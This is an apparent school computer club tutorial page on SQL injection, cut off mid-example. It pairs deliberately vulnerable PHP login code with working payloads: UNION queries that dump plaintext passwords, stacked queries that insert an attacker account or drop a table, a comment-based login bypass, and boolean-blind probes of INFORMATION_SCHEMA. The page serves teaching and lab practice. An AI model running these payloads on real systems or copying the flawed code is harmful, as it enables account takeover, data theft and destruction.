<!DOCTYPE HTML>
<html lang="en-US" >
    
    <head>
        
        <meta charset="UTF-8">
        <title>SQL Injection 2 | Introduction</title>
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="generator" content="GitBook 1.0.3">
        <meta name="HandheldFriendly" content="true"/>
        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
        <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
        
    
    
    
    
    <link rel="prev" href="..\../web/sql1/sql1.html" />
    

        
    </head>
    <body>
        
        
<link rel="stylesheet" href="../../gitbook/style.css">


        
    <div class="book"  data-level="2.2" data-basepath="..\.." data-revision="1420612248596">
    

<div class="book-summary">
    <div class="book-search">
        <input type="text" placeholder="Type to search" class="form-control" />
    </div>
    <ul class="summary">
        
    	
    	
    	

        

        
    
        
        <li class="chapter " data-level="0" data-path="index.html">
            
                
                    <a href="..\../index.html">
                        <i class="fa fa-check"></i>
                        
                         Introduction
                    </a>
                
            
            
            <ul class="articles">
                
    
        
        <li class="chapter " data-level="0.1" data-path="SUMMARY.html">
            
                
                    <a href="..\../SUMMARY.html">
                        <i class="fa fa-check"></i>
                        
                            <b>0.1.</b>
                        
                         TOC
                    </a>
                
            
            
        </li>
    

            </ul>
            
        </li>
    
        
        <li class="chapter " data-level="1" >
            
            <span><b>1.</b> Club Items</span>
            
            
            <ul class="articles">
                
    
        
        <li class="chapter " data-level="1.1" data-path="home/constitution/constitution.html">
            
                
                    <a href="..\../home/constitution/constitution.html">
                        <i class="fa fa-check"></i>
                        
                            <b>1.1.</b>
                        
                         Constitution
                    </a>
                
            
            
        </li>
    
        
        <li class="chapter " data-level="1.2" data-path="home/calendar/calendar.html">
            
                
                    <a href="..\../home/calendar/calendar.html">
                        <i class="fa fa-check"></i>
                        
                            <b>1.2.</b>
                        
                         Calendar
                    </a>
                
            
            
        </li>
    

            </ul>
            
        </li>
    
        
        <li class="chapter " data-level="2" >
            
            <span><b>2.</b> Web</span>
            
            
            <ul class="articles">
                
    
        
        <li class="chapter " data-level="2.1" data-path="web/sql1/sql1.html">
            
                
                    <a href="..\../web/sql1/sql1.html">
                        <i class="fa fa-check"></i>
                        
                            <b>2.1.</b>
                        
                         SQL Injection 1
                    </a>
                
            
            
        </li>
    
        
        <li class="chapter active" data-level="2.2" data-path="web/sql2/sql2.html">
            
                
                    <a href="..\../web/sql2/sql2.html">
                        <i class="fa fa-check"></i>
                        
                            <b>2.2.</b>
                        
                         SQL Injection 2
                    </a>
                
            
            
        </li>
    

            </ul>
            
        </li>
    
        
        <li class="chapter " data-level="3" >
            
            <span><b>3.</b> Forensics</span>
            
            
            <ul class="articles">
                
    
        
        <li class="chapter " data-level="3.1" data-path="forensics/steg1/steg1.html">
            
                
                    <a href="..\../forensics/steg1/steg1.html">
                        <i class="fa fa-check"></i>
                        
                            <b>3.1.</b>
                        
                         Steganography 1
                    </a>
                
            
            
        </li>
    
        
        <li class="chapter " data-level="3.2" data-path="forensics/filecarving1/filecarving1.html">
            
                
                    <a href="..\../forensics/filecarving1/filecarving1.html">
                        <i class="fa fa-check"></i>
                        
                            <b>3.2.</b>
                        
                         File Carving 1
                    </a>
                
            
            
        </li>
    
        
        <li class="chapter " data-level="3.3" data-path="forensics/filestructure/filestructure.html">
            
                
                    <a href="..\../forensics/filestructure/filestructure.html">
                        <i class="fa fa-check"></i>
                        
                            <b>3.3.</b>
                        
                         File Structure
                    </a>
                
            
            
        </li>
    
        
        <li class="chapter " data-level="3.4" data-path="forensics/filesystem1/filesystem1.html">
            
                
                    <a href="..\../forensics/filesystem1/filesystem1.html">
                        <i class="fa fa-check"></i>
                        
                            <b>3.4.</b>
                        
                         File System 1
                    </a>
                
            
            
        </li>
    

            </ul>
            
        </li>
    
        
        <li class="chapter " data-level="4" >
            
            <span><b>4.</b> Hardware</span>
            
            
            <ul class="articles">
                
    
        
        <li class="chapter " data-level="4.1" data-path="hardware/computer_hardware_1/computerhardware1.html">
            
                
                    <a href="..\../hardware/computer_hardware_1/computerhardware1.html">
                        <i class="fa fa-check"></i>
                        
                            <b>4.1.</b>
                        
                         Computer Hardware 1
                    </a>
                
            
            
        </li>
    

            </ul>
            
        </li>
    
        
        <li class="chapter " data-level="5" >
            
            <span><b>5.</b> Software</span>
            
            
            <ul class="articles">
                
    
        
        <li class="chapter " data-level="5.1" data-path="software/blender1/blender1.html">
            
                
                    <a href="..\../software/blender1/blender1.html">
                        <i class="fa fa-check"></i>
                        
                            <b>5.1.</b>
                        
                         Blender 1
                    </a>
                
            
            
        </li>
    
        
        <li class="chapter " data-level="5.2" data-path="software/blender2/blender2.html">
            
                
                    <a href="..\../software/blender2/blender2.html">
                        <i class="fa fa-check"></i>
                        
                            <b>5.2.</b>
                        
                         Blender 2
                    </a>
                
            
            
        </li>
    
        
        <li class="chapter " data-level="5.3" data-path="software/linux1/linux1.html">
            
                
                    <a href="..\../software/linux1/linux1.html">
                        <i class="fa fa-check"></i>
                        
                            <b>5.3.</b>
                        
                         Linux 1
                    </a>
                
            
            
        </li>
    

            </ul>
            
        </li>
    
        
        <li class="chapter " data-level="6" >
            
            <span><b>6.</b> Binary</span>
            
            
            <ul class="articles">
                
    
        
        <li class="chapter " data-level="6.1" data-path="binary/overflow1/overflow1.html">
            
                
                    <a href="..\../binary/overflow1/overflow1.html">
                        <i class="fa fa-check"></i>
                        
                            <b>6.1.</b>
                        
                         Overflow 1
                    </a>
                
            
            
        </li>
    
        
        <li class="chapter " data-level="6.2" data-path="binary/overflow2/overflow2.html">
            
                
                    <a href="..\../binary/overflow2/overflow2.html">
                        <i class="fa fa-check"></i>
                        
                            <b>6.2.</b>
                        
                         Overflow 2
                    </a>
                
            
            
        </li>
    

            </ul>
            
        </li>
    


        
        <li class="divider"></li>
        <li>
            <a href="http://www.gitbook.io/" target="blank" class="gitbook-link">Published using GitBook</a>
        </li>
        
    </ul>
</div>

    <div class="book-body">
        <div class="body-inner">
            <div class="book-header">
    <!-- Actions Left -->
    <a href="#" class="btn pull-left toggle-summary" aria-label="Toggle summary"><i class="fa fa-align-justify"></i></a>
    <a href="#" class="btn pull-left toggle-search" aria-label="Toggle search"><i class="fa fa-search"></i></a>
    
    <div id="font-settings-wrapper" class="dropdown pull-left">
        <a href="#" class="btn toggle-dropdown" aria-label="Toggle font settings"><i class="fa fa-font"></i>
        </a>
        <div class="dropdown-menu font-settings">
    <div class="dropdown-caret">
        <span class="caret-outer"></span>
        <span class="caret-inner"></span>
    </div>

    <div class="buttons">
        <button type="button" id="reduce-font-size" class="button size-2">A</button>
        <button type="button" id="enlarge-font-size" class="button size-2">A</button>
    </div>

    <div class="buttons font-family-list">
        <button type="button" data-font="0" class="button">Serif</button>
        <button type="button" data-font="1" class="button">Sans</button>
    </div>

    <div class="buttons color-theme-list">
        <button type="button" id="color-theme-preview-0" class="button size-3" data-theme="0">White</button>
        <button type="button" id="color-theme-preview-1" class="button size-3" data-theme="1">Sepia</button>
        <button type="button" id="color-theme-preview-2" class="button size-3" data-theme="2">Night</button>
    </div>
</div>

    </div>

    <!-- Actions Right -->
    
    <div class="dropdown pull-right">
        <a href="#" class="btn toggle-dropdown" aria-label="Toggle share dropdown"><i class="fa fa-share-alt"></i>
        </a>
        <div class="dropdown-menu font-settings dropdown-left">
            <div class="dropdown-caret">
                <span class="caret-outer"></span>
                <span class="caret-inner"></span>
            </div>
            <div class="buttons">
                <button type="button" data-sharing="twitter" class="button">Twitter</button>
                <button type="button" data-sharing="google-plus" class="button">Google</button>
                <button type="button" data-sharing="facebook" class="button">Facebook</button>
                <button type="button" data-sharing="weibo" class="button">Weibo</button>
                <button type="button" data-sharing="instapaper" class="button">Instapaper</button>
            </div>
        </div>
    </div>
    

    
    <a href="#" target="_blank" class="btn pull-right google-plus-sharing-link sharing-link" data-sharing="google-plus" aria-label="Share on Google Plus"><i class="fa fa-google-plus"></i></a>
    
    
    <a href="#" target="_blank" class="btn pull-right facebook-sharing-link sharing-link" data-sharing="facebook" aria-label="Share on Facebook"><i class="fa fa-facebook"></i></a>
    
    
    <a href="#" target="_blank" class="btn pull-right twitter-sharing-link sharing-link" data-sharing="twitter" aria-label="Share on Twitter"><i class="fa fa-twitter"></i></a>
    
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href="..\../" >Introduction</a>
    </h1>
</div>

            <div class="page-wrapper" tabindex="-1">
                <div class="page-inner">
                
                
                    <section class="normal" id="section-gitbook_761">
                    
                        <h1 id="sql-injection-2">SQL Injection 2</h1>
<h3 id="more-advanced-sql">More Advanced SQL</h3>
<p>Where does MySQL store information about databases and tables? Can we retrieve the information? MySQL and other SQL servers store metadata about objects in a database called INFORMATION_SCHEMA. Before proceeding however, we need to understand an SQL syntax. SQL works in a hierarchy structure (database, table, column). To simply some processes, a period is used in place of qualifiers. This allows us to select a column without the need of a complex query.</p>
<pre><code class="lang-sql">#<span class="hljs-operator"><span class="hljs-keyword">Select</span> the <span class="hljs-keyword">column</span> <span class="hljs-string">'test'</span> <span class="hljs-keyword">from</span> the <span class="hljs-keyword">table</span> <span class="hljs-string">'sql2'</span> <span class="hljs-keyword">in</span> the <span class="hljs-keyword">database</span> <span class="hljs-string">'tutorial_2'</span>
<span class="hljs-keyword">SELECT</span> test <span class="hljs-keyword">FROM</span> tutorial_2.sql2</span>
</code></pre>
<p>Let&#39;s get back to the magical metadata storing database called INFORMATION_SCHEMA. The database contains many tables that contain crucial information about the structure and format of tables in other databases. There are two tables that we are particularly going to focus on. The table INFORMATION_SCHEMA.COLUMNS contains data regarding the column names and column position of databases. The table INFORMATION_SCHEMA.TABLES contains data regarding table names. For more information (that you definitely will need), view the MySQL Documentation on the structure of INFORMATION_SCHEMA.
New Lesson, New Table</p>
<p>The last lesson&#39;s table is not realistic enough for the purpose of this lesson. I mean, who would actually make a table like that (aside from me)? Let&#39;s create a new database called tutorial_2 and a table named userinfo. The data below shows the structure of the table.</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>Username</th>
<th>Password</th>
<th>Email</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>kbarr96</td>
<td>iamzbarr</td>
<td>kbarr@gmail.com</td>
</tr>
<tr>
<td>2</td>
<td>bobbyluig</td>
<td>123456</td>
<td>bobbyluig@hotmail.com</td>
</tr>
<tr>
<td>3</td>
<td>mark17</td>
<td>F341CK29fjqq</td>
<td>markdark17@aol.com</td>
</tr>
<tr>
<td>4</td>
<td>andies98</td>
<td>andies98</td>
<td>adny89@yahoo.com</td>
</tr>
<tr>
<td>5</td>
<td>nobias123</td>
<td>120997</td>
<td>ihavenobias@ymail.com</td>
</tr>
</tbody>
</table>
<p>What is wrong with this table?</p>
<ul>
<li>&#39;bobbyluig&#39; used an easy password</li>
<li>&#39;nobias123&#39; used his birthday, another easy password</li>
<li>&#39;andies98&#39; used his username, the worst idea ever</li>
<li>The passwords are stored in raw format (never do this)</li>
</ul>
<h3 id="some-basic-php-for-basic-things">Some Basic PHP for Basic Things</h3>
<p>Here is another basic PHP script that takes a posted username value as the input and outputs the email address associated with the username.</p>
<pre><code class="lang-php"><span class="hljs-preprocessor">&lt;?php</span>

<span class="hljs-comment">//Create a new database</span>
<span class="hljs-variable">$database</span> = <span class="hljs-keyword">new</span> mysqli( <span class="hljs-string">'localhost'</span>, <span class="hljs-string">'DB_USER'</span>, <span class="hljs-string">'DB_PASS'</span>, <span class="hljs-string">'tutorial_2'</span> );

<span class="hljs-comment">//For debugging purposes in case the connection failed</span>
<span class="hljs-keyword">if</span>( !<span class="hljs-variable">$database</span> )
{
    <span class="hljs-keyword">die</span>( <span class="hljs-string">'MySQL: Wrong credentials'</span> );
}

<span class="hljs-comment">//Set the character set</span>
<span class="hljs-variable">$database</span><span class="hljs-variable">-&gt;set_charset</span>(<span class="hljs-string">"utf8"</span>);

<span class="hljs-comment">//Get the posted user input</span>
<span class="hljs-variable">$user</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'user'</span>];

<span class="hljs-comment">//Execute a query</span>
<span class="hljs-variable">$result</span> = <span class="hljs-variable">$database</span><span class="hljs-variable">-&gt;query</span>
(
    <span class="hljs-string">"SELECT Email FROM userinfo WHERE Username='$user'"</span>
);

<span class="hljs-comment">//Checks whether the query was successful and whether there is actually data (at least 1 row of matching data)</span>
<span class="hljs-keyword">if</span>( !<span class="hljs-variable">$result</span> || mysqli_num_rows( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">0</span> )
{
    <span class="hljs-keyword">die</span>( <span class="hljs-string">'Error'</span> );
}

<span class="hljs-comment">//Prints out the email</span>
<span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> ) )
{
    <span class="hljs-keyword">echo</span>( <span class="hljs-string">"Email: "</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">'Email'</span>] );
}

<span class="hljs-preprocessor">?&gt;</span>
</code></pre>
<p>We already know how to make this code output all of the email addresses at once without knowing any of the usernames. But that&#39;s no fun. I want the passwords. How might one do that you ask? The query clearly selects &#39;Email&#39; and prints out the email. However, we can use the UNION operator in MySQL to &quot;combine the result from multiple SELECT statements into a single result set&quot; (MySQL par. 1). I have no idea why I cited that. Anyway, we can now play around and steal some information with our new assistant the UNION operator.</p>
<pre><code>1) Get all of the usernames
&#39; UNION SELECT Username FROM userinfo WHERE &#39;&#39;=&#39;

2) Get all of the passwords
&#39; UNION SELECT Password FROM userinfo WHERE &#39;&#39;=&#39;
</code></pre><p>How the query looks now:</p>
<pre><code class="lang-sql"># 1)
<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> Email <span class="hljs-keyword">FROM</span> userinfo <span class="hljs-keyword">WHERE</span> Username=<span class="hljs-string">''</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> Username <span class="hljs-keyword">FROM</span> userinfo <span class="hljs-keyword">WHERE</span> <span class="hljs-string">''</span>=<span class="hljs-string">''</span>

# <span class="hljs-number">2</span>)
<span class="hljs-keyword">SELECT</span> Email <span class="hljs-keyword">FROM</span> userinfo <span class="hljs-keyword">WHERE</span> Username=<span class="hljs-string">''</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">Password</span> <span class="hljs-keyword">FROM</span> userinfo <span class="hljs-keyword">WHERE</span> <span class="hljs-string">''</span>=<span class="hljs-string">''</span></span>
</code></pre>
<p>The first part of the query returns nothing. However, the second part of the query returns all of the usernames or passwords. And there we have it. It&#39;s as easy as stealing candy from a baby. Or an SQL server.</p>
<h3 id="being-malicious">Being Malicious</h3>
<p>So far, we&#39;ve only discussed how to recon for information. What if we wanted to add a user to the database or delete something? In MySQL, a semicolon indicates the end of a statement. Therefore, we can terminate one statement and start another to perform a different function all within the same query. You might notice the annoying &#39; at the end which forced us in the previous example to use WHERE &#39;&#39;=&#39; to consumed the final single quote. However, you may have also noticed that # or -- is used to define the start of a comment. We can use this knowledge to our adavantage.</p>
<pre><code>1) Adding something to the table
&#39;; INSERT INTO userinfo (&#39;Username&#39;, &#39;Password&#39;, &#39;Email&#39;) VALUES (&#39;thehacker&#39;, &#39;2kvLXCR&#39;, &#39;ugot@hacked.com&#39;); #

2) Deleting everything
&#39;; DROP TABLE userinfo; #
</code></pre><p>The resultant queries:</p>
<pre><code class="lang-sql"># 1)
<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> Email <span class="hljs-keyword">FROM</span> userinfo <span class="hljs-keyword">WHERE</span> Username=<span class="hljs-string">''</span>;</span> <span class="hljs-operator"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> userinfo (<span class="hljs-string">'Username'</span>, <span class="hljs-string">'Password'</span>, <span class="hljs-string">'Email'</span>) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'thehacker'</span>, <span class="hljs-string">'2kvLXCR'</span>, <span class="hljs-string">'ugot@hacked.com'</span>);</span> #'

# 2)
<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> Email <span class="hljs-keyword">FROM</span> userinfo <span class="hljs-keyword">WHERE</span> Username=<span class="hljs-string">''</span>;</span> <span class="hljs-operator"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> userinfo;</span> #'
</code></pre>
<p>You can see how dangerous and malicious this is. Please DO NOT try this on actual websites. However, you do have full permission to engage CAMS CSC servers in any way you like.</p>
<h3 id="logging-in">Logging In</h3>
<p>Many websites employ some form of a login system. Most of those login systems utilize SQL. Let&#39;s look at an example of a simple login system. I have highlighted the flaws.</p>
<pre><code class="lang-php"><span class="hljs-preprocessor">&lt;?php</span>

<span class="hljs-comment">//Create a new database</span>
<span class="hljs-variable">$database</span> = <span class="hljs-keyword">new</span> mysqli( <span class="hljs-string">'localhost'</span>, <span class="hljs-string">'DB_USER'</span>, <span class="hljs-string">'DB_PASS'</span>, <span class="hljs-string">'tutorial_2'</span> );

<span class="hljs-comment">//For debugging purposes in case the connection failed</span>
<span class="hljs-keyword">if</span>( !<span class="hljs-variable">$database</span> )
{
    <span class="hljs-keyword">die</span>( <span class="hljs-string">'MySQL: Wrong credentials'</span> );
}

<span class="hljs-comment">//Set the character set</span>
<span class="hljs-variable">$database</span><span class="hljs-variable">-&gt;set_charset</span>(<span class="hljs-string">"utf8"</span>);

<span class="hljs-comment">//Get the posted username and password</span>
<span class="hljs-variable">$user</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'username'</span>];
<span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>];

<span class="hljs-comment">//Execute a query</span>
<span class="hljs-variable">$result</span> = <span class="hljs-variable">$database</span><span class="hljs-variable">-&gt;query</span>
(
    <span class="hljs-string">"SELECT * FROM userinfo WHERE Username='$user' AND Password='$pass'"</span>
);

<span class="hljs-comment">//Checks whether the query was successful and whether there is actually data (at least 1 row of matching data)</span>
<span class="hljs-keyword">if</span>( !<span class="hljs-variable">$result</span> || mysqli_num_rows( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">0</span> )
{
    <span class="hljs-keyword">die</span>( <span class="hljs-string">'Error'</span> );
}
<span class="hljs-keyword">else</span>
{
    <span class="hljs-comment">//Code to perform action when user successfully logs in.</span>
}

<span class="hljs-preprocessor">?&gt;</span>
</code></pre>
<p>The username and password values from lines 14 and 15 are not escaped. In addition, the code only checks for whether there is one or more rows of data (line 24). This leaves a wide opening for SQL Injections. A second and more secure version is shown below.</p>
<pre><code class="lang-php"><span class="hljs-preprocessor">&lt;?php</span>

<span class="hljs-comment">//Omitted Code</span>

<span class="hljs-comment">//Checks whether the query was successful and whether there is only 1 row</span>
<span class="hljs-keyword">if</span>( !<span class="hljs-variable">$result</span> || mysqli_num_rows( <span class="hljs-variable">$result</span> ) != <span class="hljs-number">1</span> )
{
    <span class="hljs-keyword">die</span>( <span class="hljs-string">'Error'</span> );
}
<span class="hljs-keyword">else</span>
{
    <span class="hljs-comment">//Code to perform action when user successfully logs in.</span>
}

<span class="hljs-preprocessor">?&gt;</span>
</code></pre>
<p>However, even the more secure version cannot save you. If someone knows a username, he/she could easily get into the account by injecting the username field with the following:</p>
<pre><code class="lang-sql">bobby&#39; #
</code></pre>
<p>The resulting query would skip the password check.</p>
<pre><code class="lang-sql"><span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> userinfo <span class="hljs-keyword">WHERE</span> Username=<span class="hljs-string">'bobby'</span> #<span class="hljs-string">' AND Password='</span>$pass<span class="hljs-string">'</span></span>
</code></pre>
<h3 id="advanced-injections">Advanced Injections</h3>
<p>We will analyze the flawed PHP login code where more than one row will still result in a successful login. The same concepts can also be applied to the more secure version as long as the variables are not sanitized. We will now take a realistic standpoint by assuming that we do not know any users on the database nor do we have access to any of the code. The first step is to check whether the system is flawed. This can be done by using some of the SQL Injection methods. Once that is completed, begin reconstructing the query and the PHP code involved. Finally, construct the necessary attacks.</p>
<p>The first two steps have already been explained. We will focus on the attack constructions. Let&#39;s assume that we constructed the following server-side code.</p>
<pre><code class="lang-php"><span class="hljs-preprocessor">&lt;?php</span>

<span class="hljs-variable">$database</span> = <span class="hljs-keyword">new</span> mysqli( <span class="hljs-string">'localhost'</span>, <span class="hljs-string">'DB_USER'</span>, <span class="hljs-string">'DB_PASS'</span>, <span class="hljs-string">'DB_NAME'</span> );

<span class="hljs-variable">$user</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'username'</span>];
<span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>];

<span class="hljs-variable">$result</span> = <span class="hljs-variable">$database</span><span class="hljs-variable">-&gt;query</span>
(
    <span class="hljs-string">"SELECT 'something' FROM 'table' WHERE 'usercolumn'='$user' AND 'passcolumn'='$pass'"</span>
);

<span class="hljs-keyword">if</span>( !<span class="hljs-variable">$result</span> || mysqli_num_rows( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">0</span> )
{
    <span class="hljs-keyword">die</span>( <span class="hljs-string">'Error'</span> );
}
<span class="hljs-keyword">else</span>
{
    <span class="hljs-comment">//Code to perform action when user successfully logs in.</span>
}

<span class="hljs-preprocessor">?&gt;</span>

<span class="hljs-comment">//What we want need to find out:</span>
<span class="hljs-comment">//'DB_NAME': The database name.</span>
<span class="hljs-comment">//'table': The table name.</span>
<span class="hljs-comment">//'usercolumn': The first column's name.</span>
<span class="hljs-comment">//'passcolumn': The second column's name.</span>
<span class="hljs-comment">//Additional columns or tables on the server.</span>
</code></pre>
<p>There is a lot of stuff that can be found. But how can they be found? The code we have constructed only shows to possibilities. The login either fails or succeeds. Believe it or not, a true or false is all we need to find out all the data we need. Brute-forcing by pure combination is one possibility. Another type of brute-forcing that saves much more time (maybe a few trillion years?) can be performed with the assistance of the LIKE operator. Let&#39;s first look at the power of LIKE.</p>
<pre><code class="lang-sql"># 1)A &#39;Password&#39; value with the letter b in it
... Password LIKE &#39;%b%&#39;

# 2)A &#39;Password&#39; value where the first letter is b
... Password LIKE &#39;b%&#39;

# 3)A &#39;Password&#39; value where the second letter is b
... Password LIKE &#39;_b%&#39;

# 4)A &#39;Password&#39; value where the last letter is b
... Password LIKE &#39;%b&#39;

# 5)A &#39;Password&#39; value where the second to last letter is b
... Password LIKE &#39;%b_&#39;
</code></pre>
<p>We can now use this magical operator to ask the server yes or no questions and find out all the information we need. We can input anything into the username that doesn&#39;t mess with the query. I&#39;ll be using &#39;bar&#39; without quotes. The following password queries were sent. The results are shown them.</p>
<pre><code class="lang-sql"># Query 1
' OR EXISTS(<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'s%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #</span>
</code></pre>
<pre><code class="lang-sql"># Query 2
' OR EXISTS(<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'t%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #</span>
</code></pre>
<pre><code class="lang-sql"># Query 3
' OR EXISTS(<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'u%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #</span>
</code></pre>
<pre><code class="lang-sql"># Query 4
' OR EXISTS(<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'tt%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #</span>
</code></pre>
<pre><code class="lang-sql"># Query 5
' OR EXISTS(<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'tz%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #</span>
</code></pre>
<pre><code class="lang-sql"># Query 6
' OR EXISTS(<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'tu%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #</span>
</code></pre>
<p>Resultant queries:</p>
<pre><code class="lang-sql"># Query 1
<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> userinfo <span class="hljs-keyword">WHERE</span> Username=<span class="hljs-string">'bar'</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">Password</span>=<span class="hljs-string">''</span> <span class="hljs-keyword">OR</span> <span class="hljs-keyword">EXISTS</span>(<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'s%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #<span class="hljs-string">'</span></span>
</code></pre>
<pre><code class="lang-sql"># Query 2
<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> userinfo <span class="hljs-keyword">WHERE</span> Username=<span class="hljs-string">'bar'</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">Password</span>=<span class="hljs-string">''</span> <span class="hljs-keyword">OR</span> <span class="hljs-keyword">EXISTS</span>(<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'t%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #<span class="hljs-string">'</span></span>
</code></pre>
<pre><code class="lang-sql"># Query 3
<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> userinfo <span class="hljs-keyword">WHERE</span> Username=<span class="hljs-string">'bar'</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">Password</span>=<span class="hljs-string">''</span> <span class="hljs-keyword">OR</span> <span class="hljs-keyword">EXISTS</span>(<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'u%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #<span class="hljs-string">'</span></span>
</code></pre>
<pre><code class="lang-sql"># Query 4
<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> userinfo <span class="hljs-keyword">WHERE</span> Username=<span class="hljs-string">'bar'</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">Password</span>=<span class="hljs-string">''</span> <span class="hljs-keyword">OR</span> <span class="hljs-keyword">EXISTS</span>(<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'tt%'</span> <span class="hljs-keyword">AND</span> TABLE_SCHEMA != <span class="hljs-string">'information_schema'</span>) #<span class="hljs-string">'</span></span>
</code></pre>
<pre><code class="lang-sql"># Query 5
